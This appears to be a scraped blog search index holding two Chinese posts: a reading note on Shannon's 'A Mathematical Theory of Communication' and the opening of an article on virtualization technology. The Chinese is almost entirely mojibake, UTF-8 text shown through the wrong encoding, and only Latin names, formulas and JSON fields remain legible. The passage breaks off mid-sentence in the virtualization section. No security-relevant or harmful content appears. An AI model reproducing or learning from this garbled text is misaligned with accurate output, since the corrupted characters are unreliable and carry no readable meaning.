åˆé€‚ã€‚è®¸å¤šé™åˆ¶æ€§çš„æ“ä½œåœ¨å–å¯¹æ•°åå¾ˆç®€å•ï¼Œä½†å¯èƒ½åœ¨æ•°é‡çº§ä¸Šä»¤äººéš¾ä»¥æƒ³è±¡\n è®²è¿°äº†ä¸ºä»€ä¹ˆåœ¨é€šä¿¡é¢†åŸŸé‡‡ç”¨å¯¹æ•°å‡½æ•°è¿›è¡Œè¡¡é‡\n å¯¹æ•°å‡½æ•°åº•æ•°çš„é€‰æ‹©åº”è¯¥å’Œæµ‹é‡ä¿¡æ¯çš„å•ä½çš„é€‰æ‹©ç›¸ç¬¦åˆã€‚äºŒè¿›åˆ¶æ•°å­—ï¼Œæˆ–è€…æ›´ç®€å•åœ°ç§°ä¹‹ä¸ºbitï¼Œä¼šä½¿ç”¨åº•æ•°ä¸º2çš„å¯¹æ•°å‡½æ•°ã€‚ä¸€ä¸ªå…·æœ‰ä¸¤ä¸ªç¨³å®šä½ç½®çš„è®¾å¤‡ï¼Œå¦‚ç»§ç”µå™¨æˆ–è§¦å‘å™¨ç”µè·¯ï¼Œå¯ä»¥å­˜å‚¨ä¸€ä½ä¿¡æ¯ã€‚Nä¸ªè¿™æ ·çš„è®¾å¤‡èƒ½å­˜å‚¨N bitä¿¡æ¯ï¼ˆæ‰€æœ‰å¯èƒ½çš„çŠ¶æ€ä¸º2^Nï¼Œç„¶åå–å¯¹æ•°çš„N = Log2(2^N) ï¼‰ã€‚åè¿›åˆ¶çš„æ•°å­—å¯èƒ½ä¼šä½¿ç”¨ä»¥10ä¸ºåº•çš„å¯¹æ•°å‡½æ•°ã€‚æ­£å¦‚ Log2(M) = Log10(M) / Log10(2) = 3.32Log10(M) ï¼Œä¸€ä¸ªåè¿›åˆ¶æ•°å­—å¤§çº¦ä¸º10/3 bitsã€‚å°å¼æœºä¸Šçš„æ•°å­—è½®æœ‰10ä¸ªä½ç½®ï¼Œå› æ­¤æœ‰ä¸€ä¸ªå¯ä»¥å­˜å‚¨ä¸€ä¸ªæ•°å­—å®¹é‡ã€‚åœ¨æ¶‰åŠç§¯åˆ†å’Œå¾®åˆ†çš„åˆ†æå·¥ä½œä¸­ï¼Œåº•æ•°eæ˜¯éå¸¸æœ‰ç”¨çš„ï¼Œç”±æ­¤äº§ç”Ÿçš„ä¿¡æ¯å•ä½ç§°ä¹‹ä¸ºè‡ªç„¶å•ä½(natural units)ã€‚æŠŠåº•æ•°ä¸ºaçš„å¯¹æ•°è½¬æ¢æˆåº•æ•°ä¸ºbçš„å¯¹æ•°åªéœ€è¦å°†å…¶ä¹˜ä»¥logb(a)ã€‚\n å¤§æ¦‚æ˜¯åœ¨è®²å¯¹æ•°åº•æ•°ä¸åŒå’Œä¿¡æ¯åº¦é‡å•ä½çš„å…³ç³»ï¼Œè®²è¿°äº†ä¸åŒåº•çš„å¯¹æ•°çš„ä¸åŒå±•ç°\n å¦‚ä¸Šå›¾ï¼ˆFig.1 ï¼‰ï¼Œæˆ‘ä»¬å±•ç¤ºäº†ä¸€ä¸ªé€šä¿¡ç³»ç»Ÿçš„æ¨¡å‹å›¾ã€‚è¿™åŒ…æ‹¬5ä¸ªé‡è¦çš„éƒ¨åˆ†ï¼š\n  ä¸€ä¸ªç»™æ¥æ”¶ç»ˆç«¯äº§ç”Ÿç”¨äºé€šä¿¡æ¶ˆæ¯çš„ä¿¡æ¯æºã€‚æ¶ˆæ¯å¯èƒ½æœ‰å¤šç§è¡¨ç°ï¼š\n(a)ç±»ä¼¼ç”¨ç”µæŠ¥ä¼ è¾“çš„ä¸€ä¸²å­—æ¯ï¼›\n(b)ä¸€ä¸ªå…³äºæ—¶é—´çš„å‡½æ•°ï¼Œä¾‹å¦‚åœ¨æ— çº¿ç”µæˆ–ç”µè¯ä¸­ï¼›\n(c)ä¸€ä¸ªå…³äºæ—¶é—´å’Œå…¶ä»–å˜é‡ä¸€èµ·çš„å‡½æ•°ï¼Œä¾‹å¦‚é»‘ç™½ç”µè§†â€”â€”ä¿¡æ¯å¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªæ—¶é—´å’Œåæ ‡ç‚¹å¤åˆçš„å‡½æ•°f(x,y,t)ï¼Œå‡½æ•°å€¼è¡¨ç¤º(x,y)ç‚¹åœ¨æ—¶é—´tçš„å…‰å¼ºï¼›\n(d)ä¸¤ä¸ªæˆ–ä»¥ä¸Šçš„å…³äºæ—¶é—´çš„å‡½æ•°ï¼Œå¦‚f(t)ã€g(t)ã€h(t)åœ¨ä¸‰ç»´å£°éŸ³ä¼ è¾“ç³»ç»Ÿçš„æƒ…å†µï¼Œæˆ–è€…æ˜¯åœ¨ç³»ç»Ÿæ‰“ç®—åœ¨å¤šè·¯å¤ç”¨ä¸­ä½¿ç”¨å¤šä¸ªä¿¡é“ï¼›\n(e)å¤šä¸ªå¤åˆå‡½æ•°ï¼Œå¦‚å½©è‰²ç”µè§†ä¸­çš„å˜é‡ä¿¡æ¯ç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼Œåœ¨ä¸‰ç»´è¿ç»­ä½“ä¸­å®šä¹‰çš„å‡½æ•°r(x,y,t)ã€g(x,y,t)ã€b(x,y,t)ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠè¿™ä¸‰ä¸ªå‡½æ•°çœ‹ä½œæ˜¯åœ¨è¯¥åŒºåŸŸå®šä¹‰çš„å‘é‡åœºçš„ç»„æˆéƒ¨åˆ†ï¼Œç±»ä¼¼åœ°ï¼Œå‡ ä¸ªé»‘ç™½ç”µè§†ä¿¡å·æºå°†äº§ç”Ÿç”±è‹¥å¹²ä¸ªä¸‰å…ƒå‡½æ•°ç»„æˆçš„ä¿¡æ¯ï¼›\n(f)ä»¥ä¸Šå¤šç§æƒ…å†µçš„ç»„åˆï¼Œæ¯”å¦‚æœ‰å£°éŸ³çš„å½©è‰²ç”µè§†ã€‚\n  ä¸€ä¸ªè´Ÿè´£å°†æ¶ˆæ¯è½¬å˜ä¸ºèƒ½å¤Ÿåœ¨ä¿¡é“ä¸Šä¼ è¾“çš„åˆé€‚çš„ä¿¡å·çš„å‘å°„å™¨ã€‚\nåœ¨ç”µè¯æŠ€æœ¯ä¸­ï¼Œå‘å°„å™¨å°†å£°å‹è½¬åŒ–ä¸ºç›¸åº”çš„ç”µæµã€‚åœ¨ç”µæŠ¥ä¸­ï¼Œæˆ‘ä»¬æœ‰ä¸€ç§ç¼–ç æ“ä½œï¼Œä½¿ä¿¡æ¯åœ¨ä¿¡é“ä¸Šå˜ä¸ºä¸€ç³»åˆ—çš„ç‚¹ã€ç ´æŠ˜å·å’Œç©ºæ ¼ï¼ˆè«å°”æ–¯ç”µç ï¼‰ã€‚åœ¨å¤šè·¯PCMç³»ç»Ÿä¸­ï¼Œä¸åŒçš„è¯­éŸ³ä¿¡å·è¦ç»è¿‡é‡‡æ ·ã€å‹ç¼©ã€é‡åŒ–ç¼–ç ï¼Œç„¶åæ‰èƒ½æ­£ç¡®çš„äº¤é”™ä¹‹åï¼Œäº§ç”Ÿä¿¡å·ã€‚\n  ä¿¡é“ä»…ä»…æ˜¯ç”¨æ¥ä¼ è¾“ä»å‘å°„å™¨åˆ°æ¥æ”¶å™¨çš„ä¿¡å·çš„ä»‹è´¨ã€‚ä¿¡é“å¯èƒ½æ˜¯ä¸€æ ¹ç”µçº¿ï¼ŒåŒè½´ç”µç¼†ï¼Œæ— çº¿ç”µé¢‘ç‡ã€å…‰æŸç­‰ã€‚\n  æ¥æ”¶å™¨ç”¨æ¥åšå’Œå‘é€å™¨ç›¸åçš„æ“ä½œï¼Œå³ä»ä¿¡å·ä¸­é‡å»ºä¿¡æ¯ã€‚\n  ä¿¡å®¿æ˜¯æ¶ˆæ¯è¦å‘é€çš„äººæˆ–ç³»ç»Ÿã€‚\n  æˆ‘ä»¬å¸Œæœ›è€ƒè™‘åœ¨é€šä¿¡ç³»ç»Ÿä¸­ä¸€äº›ä¸€èˆ¬æ€§çš„é—®é¢˜ã€‚è§£å†³è¿™ä¸€é—®é¢˜çš„é¦–è¦éœ€æ±‚æ˜¯å°†å…¶æ‰€æ¶‰åŠçš„å„ä¸ªå…ƒç´ è¡¨ç¤ºä¸ºæ•°å­¦å®ä½“ï¼Œå³æŠŠç‰©ç†ä¸Šçš„å„ä¸ªéƒ¨åˆ†ç†æƒ³åŒ–ã€‚æˆ‘ä»¬å¯ä»¥ç²—ç•¥åœ°å°†é€šä¿¡ç³»ç»Ÿåˆ†ä¸ºä¸‰ä¸ªä¸»è¦éƒ¨åˆ†ï¼šç¦»æ•£çš„ã€è¿ç»­çš„ä»¥åŠæ··åˆçš„ã€‚æˆ‘ä»¬æ‰€è¯´çš„ç¦»æ•£ç³»ç»ŸæŒ‡ä¿¡æ¯å’Œä¿¡å·éƒ½æ˜¯ç¦»æ•£ç¬¦å·åºåˆ—çš„ç³»ç»Ÿï¼Œå…¸å‹çš„ä¾‹å­å°±æ˜¯ç”µæŠ¥â€”â€”ä¿¡æ¯æ˜¯ä¸€ç³»åˆ—å­—æ¯ï¼Œè€Œä¿¡å·æ˜¯ä¸€ä¸²çš„ç‚¹æ ä»¥åŠç©ºæ ¼ã€‚ä¸€ä¸ªè¿ç»­ç³»ç»ŸæŒ‡çš„æ˜¯ä¿¡æ¯å’Œä¿¡å·éƒ½æ˜¯å¯ä»¥è¡¨ç¤ºä¸ºè¿ç»­å‡½æ•°çš„ç³»ç»Ÿï¼Œæ¯”å¦‚ç”µè§†ã€‚ä¸€ä¸ªæ··åˆç³»ç»ŸæŒ‡çš„æ˜¯ç¦»æ•£å’Œè¿ç»­å˜é‡éƒ½æœ‰çš„ç³»ç»Ÿï¼Œæ¯”å¦‚è¯­éŸ³çš„PCMä¼ è¾“ã€‚\næˆ‘ä»¬é¦–å…ˆè€ƒè™‘çš„æ˜¯ç¦»æ•£å‹çš„ç³»ç»Ÿã€‚è¿™ç§æƒ…å†µä¸ä»…åœ¨é€šä¿¡ç³»ç»Ÿç†è®ºï¼Œè€Œä¸”è¿˜åœ¨è®¡ç®—æœºç³»ç»Ÿç†è®ºï¼Œç”µè¯äº¤æ¢å’Œå…¶ä»–é¢†åŸŸæ‰€åº”ç”¨ã€‚æ­¤å¤–ï¼Œç¦»æ•£å‹ç³»ç»Ÿä¸ºè¿ç»­å‹å’Œæ··åˆå‹æƒ…å†µå¥ å®šäº†åŸºç¡€ï¼Œè¿™å°†åœ¨è®ºæ–‡çš„ååŠéƒ¨åˆ†å¾—ä»¥å±•ç°ã€‚\n è®²äº†é€šä¿¡ç³»ç»Ÿçš„å¤§æ¦‚æ¨¡å‹ï¼Œè™½ç„¶åœ¨ã€Šä¿¡æ¯è®ºä¸ç¼–ç ã€‹ä¸€ä¹¦ä¸­ç»™å‡ºäº†æ›´åŠ è¯¦ç»†çš„æ¨¡å‹ï¼Œä¸è¿‡å¤§ä½“ä¸Šæ˜¯ç›¸ä¼¼çš„ï¼Œç„¶åç®€è¦çš„ä»‹ç»äº†é€šä¿¡ç³»ç»Ÿæ¨¡å‹ä¸­å„éƒ¨åˆ†çš„ä½œç”¨ã€‚\nç„¶åå°†é€šä¿¡ç³»ç»Ÿåˆ†ä¸ºä¸‰ç±»ï¼Œå¹¶åœ¨è®ºæ–‡æ­£æ–‡ä¸­åº”è¯¥ä¼šè¯¦ç»†çš„è¿›è¡Œä»‹ç»ã€‚\n  Part â…  Discrete Noiseless System   ç¦»æ•£æ— å™ªå£°ä¿¡é“ï¼ˆThe Discrete Noiseless Channelï¼‰   ç”µä¼ æ‰“å­—æœºï¼ˆTeletypeï¼‰å’Œç”µæŠ¥ï¼ˆTelegraphyï¼‰æ˜¯ä¼ è¾“ç¦»æ•£ä¿¡æ¯ä¿¡é“çš„æœ€ç®€å•çš„ä¸¤ä¸ªä¾‹å­ã€‚æ€»çš„æ¥è¯´ï¼Œä¸€ä¸ªç¦»æ•£ä¿¡é“æ˜¯ä¸€ç§å¯ä»¥å°†ä¸€ä¸ªåºåˆ—çš„ç¬¦å·ï¼ˆä»æœ‰é™é›†åˆé‡Œé€‰æ‹©çš„ç¡®å®šç¬¦å·S1ï¼ŒS2ï¼Œ...ï¼ŒSnï¼‰ä»ä¸€ç«¯ä¼ è‡³å¦å¤–ä¸€ç«¯çš„ç³»ç»Ÿã€‚æ¯ä¸ªç¬¦å·Siåœ¨ä¸€ä¸ªç¡®å®šæ—¶é—´ti ï¼ˆæ¯ä¸ªSiçš„tiä¸ä¸€å®šç›¸åŒï¼‰å†…æ˜¯ç¡®å®šçš„ã€‚è¿™é‡Œä¸è¦æ±‚æ‰€æœ‰ç¬¦å·åºåˆ—éƒ½èƒ½åœ¨ç³»ç»Ÿä¸­ä¼ è¾“ï¼Œå¯ä»¥ä»…ä»…å…è®¸æŸäº›ç¡®å®šçš„ç¬¦å·åºåˆ—ä¼ è¾“ï¼Œè¿™äº›å°±æ˜¯åœ¨ä¿¡é“ä¸­å¯èƒ½çš„ä¿¡å·ã€‚å› æ­¤åœ¨ç”µæŠ¥ä¸­ï¼Œç¬¦å·æ˜¯ç‚¹(.)å’Œæ (-)ï¼Œç‚¹åŒ…æ‹¬ä¸€ä¸ªå•ä½æ—¶é—´çš„é—­åˆå’Œä¸€ä¸ªå•ä½æ—¶é—´çš„å¼€æ”¾ï¼Œæ åŒ…æ‹¬ä¸‰ä¸ªæ—¶é—´çš„é—­åˆå’Œä¸€ä¸ªæ—¶é—´çš„å¼€æ”¾ï¼Œä¸€ä¸ªå­—æ¯ç©ºé—´åŒ…æ‹¬ä¸‰ä¸ªå•ä½æ—¶é—´çš„å¼€æ”¾ï¼Œä¸€ä¸ªå•è¯åŒ…æ‹¬6ä¸ªå•ä½æ—¶é—´çš„å¼€æ”¾ã€‚ï¼ˆè¿™è¾¹æŒ‰ä¸ªäººç†è§£æ¥è¯´ï¼Œç”¨1è¡¨ç¤ºé—­åˆï¼Œ0è¡¨ç¤ºå¼€æ”¾ï¼Œåˆ™ç‚¹ä¸º10ï¼Œæ ä¸º1110ï¼Œå­—æ¯é—´éš”ä¸º000ï¼Œå•è¯é—´éš”ä¸º000000ï¼Œå•ä½æ—¶é—´çš„å¼€æ”¾åº”è¯¥æ˜¯ç­‰ä»·äºé—´éš”ç¬¦ï¼‰å…¶æ¬¡ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå¯¹å…è®¸çš„ç¬¦å·åºåˆ—è¿›è¡Œä¸€å®šçš„é™åˆ¶ï¼Œä¸ºäº†åœ¨ä¸¤ä¸ªç¬¦å·ä¹‹é—´æ²¡æœ‰ç©ºé—´ï¼ˆå‡å¦‚ä¸¤ä¸ªç¬¦å·ç›¸é‚»ï¼Œå°±ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªå•è¯ï¼‰ã€‚é‚£ä¹ˆç°åœ¨é—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•è¡¡é‡è¿™æ ·çš„ä¿¡é“å®¹é‡å‘¢ï¼Ÿ\n è¿™é‡Œä¸»è¦è®²äº†ç¦»æ•£ä¿¡é“çš„å®šä¹‰ï¼ˆå½“ç„¶æ˜¯è€ƒè™‘æ— å™ªå£°çš„æƒ…å†µä¸‹ï¼‰ï¼Œå¹¶ä¸”æ‹¿ç”µæŠ¥ä¼ è¾“ä¿¡é“ä¸­çš„å†…å®¹æ‹¿æ¥ä¸¾ä¾‹ï¼ˆåº”è¯¥å°±æ˜¯æ‘©æ–¯ç”µç ï¼‰ï¼Œç„¶åæŠ›å‡ºç–‘é—®ï¼Œæ€ä¹ˆå»è¡¡é‡ä¿¡é“å®¹é‡\n åœ¨ç”µä¼ æ‰“å­—æœºçš„ä¾‹å­ä¸‹ï¼Œæ‰€æœ‰çš„ä¿¡å·çš„æŒç»­æ—¶é—´ç›¸åŒï¼Œå¹¶ä¸”å…è®¸32ä¸ªç¬¦å·ä¸­çš„ä»»æ„åºåˆ—ï¼Œé‚£ä¹ˆä¿¡é“å®¹é‡æ˜¯ååˆ†å®¹æ˜“è®¡ç®—çš„ã€‚æ¯ä¸ªç¬¦å·æœ‰ç€5bitçš„ä¿¡æ¯ï¼Œå½“ç³»ç»Ÿæ¯ç§’ä¼ è¾“nä¸ªç¬¦å·æ—¶ï¼Œæ˜¾è€Œæ˜“è§çš„ï¼Œä¿¡é“å®¹é‡æ˜¯ 5n bit/s ã€‚ä½†æ˜¯è¿™å¹¶ä¸ä»£è¡¨ç€ç”µä¼ æ‰“å­—æœºçš„ä¿¡é“ä¼šä¸€ç›´ä»¥è¿™ä¸ªé€Ÿç‡ä¼ è¾“ä¿¡æ¯â€”â€”5n bit/s æ˜¯ä¿¡é“æœ€å¤§å¯èƒ½çš„ä¼ è¾“é€Ÿç‡ï¼Œå®é™…é€Ÿç‡èƒ½å¦è¾¾åˆ°è¿™ä¸ªæœ€å¤§å€¼å–å†³äºä¸ºä¿¡é“æä¾›ä¿¡æ¯çš„æ¥æºï¼ˆä¿¡æºï¼‰ï¼Œè¿™ä¼šåœ¨æ¥ä¸‹æ¥çš„æ–‡ç« ä¸­è®²åˆ°ã€‚\nPART â…¡: The Discrete Channel With Noise ","description":"","tags":["thesis","studyNote"],"title":"Reading-Note-of-A-Mathematical-Theory-of-Communication","uri":"/posts/reading-note-of-a-mathematical-theory-of-communication/"},{"categories":[],"content":"è™šæ‹ŸåŒ–æŠ€æœ¯ 0x00 åº è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œæ˜¯æˆ‘ä»¬ä¸€é¡¹å¹³æ—¶æ—¥å¸¸æ¥è§¦ï¼Œä½†ä»æœªå»ç»†è‡´äº†è§£è¿‡çš„ä¸€é¡¹æŠ€æœ¯ã€‚å°±å¦‚æˆ‘ä»¬å¸¸ç”¨çš„vmwareã€virtual boxã€docker éƒ½é‡‡ç”¨äº†ä¸åŒç¨‹åº¦çš„è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œç”šè‡³jvmä¹Ÿæ˜¯ä¸€ç§è™šæ‹ŸåŒ–æŠ€æœ¯çš„ä½“ç°ã€‚\nè¿™æ¬¡æˆ‘ä»¬æ¥äº†è§£ä¸€æ³¢è™šæ‹ŸåŒ–æŠ€æœ¯\n å‚è€ƒï¼š\nè™šæ‹ŸåŒ– - wiki\nè™šæ‹ŸåŒ–æŠ€æœ¯ä»‹ç»\nIBM- è™šæ‹ŸåŒ–æŠ€æœ¯æ¼«è°ˆ\nè™šæ‹ŸåŒ–ï¼Œçœ‹è¿™ç¯‡æ–‡ç« å°±å¤Ÿäº†\nVMware è™šæ‹ŸåŒ–ä»‹ç»\nè™šæ‹ŸåŒ–æŠ€æœ¯åº”ç”¨ä»‹ç»ï¼š\nè™šæ‹ŸåŒ–æŠ€æœ¯æ¦‚å¿µä»¥åŠåˆ†ç±»å’Œåº”ç”¨å…¨è§£\nè™šæ‹ŸåŒ–æŠ€æœ¯æ€»è§ˆ\nXenã€OpenVZã€KVMã€Hyper-Vã€VMWareè™šæ‹ŸåŒ–æŠ€æœ¯ä»‹ç»\näº‘è®¡ç®—ä¹‹è™šæ‹ŸåŒ–æŠ€æœ¯\nIntelçš„è™šæ‹ŸåŒ–æŠ€æœ¯ï¼šè‹±ç‰¹å°”Â® è™šæ‹ŸåŒ–æŠ€æœ¯ï¼ˆè‹±ç‰¹å°”Â® VTï¼‰\n 0x01 ä»€ä¹ˆæ˜¯è™šæ‹ŸåŒ– è™šæ‹ŸåŒ–ï¼ˆVirtualizationï¼‰æŠ€æœ¯æœ€æ—©å‡ºç°åœ¨ 20 ä¸–çºª 60 å¹´ä»£çš„ IBM å¤§å‹æœºç³»ç»Ÿï¼Œåœ¨70å¹´ä»£çš„ System 370 ç³»åˆ—ä¸­é€æ¸æµè¡Œèµ·æ¥ï¼Œè¿™äº›æœºå™¨é€šè¿‡ä¸€ç§å«è™šæ‹Ÿæœºç›‘æ§å™¨ï¼ˆVirtual Machine Monitorï¼ŒVMMï¼‰çš„ç¨‹åºåœ¨ç‰©ç†ç¡¬ä»¶ä¹‹ä¸Šç”Ÿæˆè®¸å¤šå¯ä»¥è¿è¡Œç‹¬ç«‹æ“ä½œç³»ç»Ÿè½¯ä»¶çš„è™šæ‹Ÿæœºï¼ˆVirtual Machineï¼‰å®ä¾‹ã€‚éšç€è¿‘å¹´å¤šæ ¸ç³»ç»Ÿã€é›†ç¾¤ã€ç½‘æ ¼ç”šè‡³äº‘è®¡ç®—çš„å¹¿æ³›éƒ¨ç½²ï¼Œè™šæ‹ŸåŒ–æŠ€æœ¯åœ¨å•†ä¸šåº”ç”¨ä¸Šçš„ä¼˜åŠ¿æ—¥ç›Šä½“ç°ï¼Œä¸ä»…é™ä½äº† IT æˆæœ¬ï¼Œè€Œä¸”è¿˜å¢å¼ºäº†ç³»ç»Ÿå®‰å…¨æ€§å’Œå¯é æ€§ï¼Œè™šæ‹ŸåŒ–çš„æ¦‚å¿µä¹Ÿé€æ¸æ·±å…¥åˆ°äººä»¬æ—¥å¸¸çš„å·¥ä½œä¸ç”Ÿæ´»ä¸­ã€‚\nwikiçš„å®šä¹‰æ˜¯è¿™ä¹ˆè®²çš„ï¼šåœ¨è®¡ç®—æœºæŠ€æœ¯ä¸­ï¼Œè™šæ‹ŸåŒ–ï¼ˆæŠ€æœ¯ï¼‰æˆ–è™šæ‹ŸæŠ€æœ¯ï¼ˆè‹±è¯­ï¼šVirtualizationï¼‰æ˜¯ä¸€ç§èµ„æºç®¡ç†æŠ€æœ¯ï¼Œæ˜¯å°†è®¡ç®—æœºçš„å„ç§å®ä½“èµ„æºï¼ˆCPUã€å†…å­˜ã€ç£ç›˜ç©ºé—´ã€ç½‘ç»œé€‚é…å™¨ç­‰ï¼‰ï¼Œäºˆä»¥æŠ½è±¡ã€è½¬æ¢åå‘ˆç°å‡ºæ¥å¹¶å¯ä¾›åˆ†å‰²ã€ç»„åˆä¸ºä¸€ä¸ªæˆ–å¤šä¸ªç”µè„‘é…ç½®ç¯å¢ƒã€‚ç”±æ­¤ï¼Œæ‰“ç ´å®ä½“ç»“æ„é—´çš„ä¸å¯åˆ‡å‰²çš„éšœç¢ï¼Œä½¿ç”¨æˆ·å¯ä»¥æ¯”åŸæœ¬çš„é…ç½®æ›´å¥½çš„æ–¹å¼æ¥åº”ç”¨è¿™äº›ç”µè„‘ç¡¬ä»¶èµ„æºã€‚è¿™äº›èµ„æºçš„æ–°è™šæ‹Ÿéƒ¨åˆ†æ˜¯ä¸å—ç°æœ‰èµ„æºçš„æ¶è®¾æ–¹å¼ï¼Œåœ°åŸŸæˆ–ç‰©ç†é…ç½®æ‰€é™åˆ¶ã€‚ä¸€èˆ¬æ‰€æŒ‡çš„è™šæ‹ŸåŒ–èµ„æºåŒ…æ‹¬è®¡ç®—èƒ½åŠ›å’Œæ•°æ®å­˜å‚¨ã€‚\nè€Œå¹¿ä¹‰ä¸Šæ¥è®²ï¼Œè™šæ‹ŸåŒ–ä»£è¡¨ç€å¯¹è®¡ç®—èµ„æºçš„æŠ½è±¡ï¼Œè€Œä¸ä»…ä»…å±€é™äºè™šæ‹Ÿæœºçš„æ¦‚å¿µã€‚ä¾‹å¦‚å¯¹ç‰©ç†å†…å­˜çš„æŠ½è±¡ï¼Œäº§ç”Ÿäº†è™šæ‹Ÿå†…å­˜æŠ€æœ¯ï¼Œä½¿å¾—åº”ç”¨ç¨‹åºè®¤ä¸ºå…¶è‡ªèº«æ‹¥æœ‰è¿ç»­å¯ç”¨çš„åœ°å€ç©ºé—´ï¼ˆAddress Spaceï¼‰ï¼Œè€Œå®é™…ä¸Šï¼Œåº”ç”¨ç¨‹åºçš„ä»£ç å’Œæ•°æ®å¯èƒ½æ˜¯è¢«åˆ†éš”æˆå¤šä¸ªç¢ç‰‡é¡µæˆ–æ®µï¼‰ï¼Œç”šè‡³è¢«äº¤æ¢åˆ°ç£ç›˜ã€é—ªå­˜ç­‰å¤–éƒ¨å­˜å‚¨å™¨ä¸Šï¼Œå³ä½¿ç‰©ç†å†…å­˜ä¸è¶³ï¼Œåº”ç”¨ç¨‹åºä¹Ÿèƒ½é¡ºåˆ©æ‰§è¡Œã€‚\n0x02 è™šæ‹ŸåŒ–çš„åˆ†ç±» è™šæ‹ŸåŒ–çš„åˆ†ç±»ä¸»è¦æœ‰ä¸¤ç§åˆ†æ³•ï¼Œä¸€ç§æŒ‰è™šæ‹Ÿçš„å¯¹è±¡åˆ†ç±»ï¼Œå¦ä¸€ç§æŒ‰æŠ½è±¡ç¨‹åº¦åˆ†ç±»\næˆ‘è¿™é‡Œå…ˆä»‹ç»æŒ‰æŠ½è±¡ç¨‹åº¦åˆ†ç±»ï¼Œæ¯•ç«ŸæŒ‰å¯¹è±¡åˆ†å¤ªæ‚äº†ï¼Œæ¨èç›´æ¥ä»wikiä¸­æŸ¥é˜…å…¶å…·ä½“åˆ†ç±»\nè€Œè™šæ‹ŸåŒ–æŠ€æœ¯çš„æœ¬è´¨åœ¨äºå¯¹è®¡ç®—æœºç³»ç»Ÿè½¯ç¡¬ä»¶èµ„æºçš„åˆ’åˆ†å’ŒæŠ½è±¡ã€‚è®¡ç®—æœºç³»ç»Ÿçš„é«˜åº¦å¤æ‚æ€§æ˜¯é€šè¿‡å„ç§å±‚æ¬¡çš„æŠ½è±¡æ¥æ§åˆ¶ï¼Œæ¯ä¸€å±‚éƒ½é€šè¿‡å±‚ä¸å±‚ä¹‹é—´çš„æ¥å£å¯¹åº•å±‚è¿›è¡ŒæŠ½è±¡ï¼Œéšè—åº•å±‚å…·ä½“å®ç°è€Œå‘ä¸Šå±‚æä¾›è¾ƒç®€å•çš„æ¥å£ã€‚\nå¦‚ä¸‹å›¾ï¼Œä¸ºä¸€ä¸ªå±‚æ¬¡å…³ç³»å›¾\nç”±è¿™ä¸ªå…³ç³»å›¾ï¼Œæˆ‘ä»¬å°†è™šæ‹ŸåŒ–æŠ€æœ¯åˆ†ä¸ºäº”ä¸ªå±‚æ¬¡\n  ç¡¬ä»¶æŠ½è±¡å±‚ç­‰çº§çš„è™šæ‹ŸåŒ–ï¼ˆHardware Abstraction Levelï¼‰   ä¸»è¦ç”±è™šæ‹Ÿæœºç›‘è§†å™¨(virtual machine monitorï¼ŒVMM\u0026Hypervisor)æ¥éšè—ä¸åŒå‚å•†çš„å¤„ç†å™¨ã€å­˜å‚¨å™¨ã€èŠ¯ç‰‡ç»„ç­‰ç­‰ç‰¹å¾ï¼Œä¸ºè¿™äº›è™šæ‹Ÿæœºæä¾›æŠ½è±¡ä¸ç»Ÿä¸€çš„è™šæ‹Ÿå¹³å°ã€‚\nç›®å‰å¤§å¤šæ•°X86å¹³å°çš„å•†ä¸šç”µè„‘ä½¿ç”¨è¿™ç§è™šæ‹ŸåŒ–ï¼Œæœ€ä¸»è¦æ˜¯ç”±äºç°ä»Šå¤„ç†å™¨å‚å•†æä¾›äº†ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–æŠ€æœ¯\nä¸»è¦çš„ä»£è¡¨æœ‰ï¼šVMware ESXiã€Hyper-Vã€Citrixã€‚\n  æŒ‡ä»¤é›†æ¶æ„ç­‰çº§çš„è™šæ‹ŸåŒ–ï¼ˆInstruction Set Architecture Levelï¼‰   æŒ‡ä»¤é›†æ¶æ„çš„è™šæ‹ŸåŒ–æ˜¯é€è¿‡è½¯ä»¶æ¥æ¨¡æ‹Ÿä¸åŒæ¶æ„çš„å¤„ç†å™¨ã€å­˜å‚¨å™¨ã€æ€»çº¿ã€ç£ç›˜æ§åˆ¶å¡ã€è®¡æ—¶å™¨ç­‰å¤šä¸ªI/Oè®¾å¤‡ï¼Œè½¯ä»¶ä¼šå°†è™šæ‹Ÿæœºæ‰€å‘å‡ºçš„æŒ‡ä»¤è½¬æ¢ä¸ºæœ¬æœºå¯ä»¥æ“ä½œçš„æŒ‡ä»¤åœ¨ç°æœ‰çš„ç¡¬ä»¶ä¸Šè¿è¡Œã€‚è¿™ç§ç­‰çº§çš„è™šæ‹ŸåŒ–å¯¹äºæ¨¡æ‹Ÿç›¸åŒå¤„ç†å™¨æ¶æ„çš„å¹³å°å¯ä»¥æä¾›å¾ˆå¥½çš„å…¼å®¹æ€§ï¼Œå¦‚X86æ¶æ„ã€Sparcæ¶æ„ã€Alphaæ¶æ„\nä¸è¿‡ç”±äºæ¯æ¡æŒ‡ä»¤éƒ½ç”±è½¯ä»¶æ¥æ¨¡æ‹Ÿï¼Œå› æ­¤ä¼šæŸå¤±è¾ƒå¤§çš„æ€§èƒ½\nä¸»è¦çš„ä»£è¡¨æœ‰ï¼šBochsã€QEMUã€‚\n  æ“ä½œç³»ç»Ÿç­‰çº§çš„è™šæ‹ŸåŒ–ï¼ˆOperating System Levelï¼‰   ç¡¬ä»¶æŠ½è±¡å±‚ç­‰çº§çš„è™šæ‹ŸåŒ–ä¸­çš„å…¨è™šæ‹ŸåŒ–ä¸æ“ä½œç³»ç»Ÿåº•å±‚é—´æœ‰éå¸¸é«˜çš„éš”ç¦»èƒ½åŠ›ï¼Œæ”¯æŒä¸åŒçš„æ“ä½œç³»ç»Ÿï¼Œ**å®‰è£…åä¸é¡»è¦é‡å¯ä¸»æœºã€æˆ–ä¿®æ”¹å¼•å¯¼ç¨‹åºï¼ˆBoot Loaderï¼‰ä»¥è¾¾åˆ°åŒç³»ç»Ÿçš„ç›®çš„ï¼Œé£é™©ä½ã€ç»´æŠ¤ç®€å•ã€‚**ç”±äºæ­¤ç­‰çº§çš„è™šæ‹Ÿæœºå¯ä»¥è®¿é—®åº•å±‚æ“ä½œç³»ç»Ÿï¼Œå› 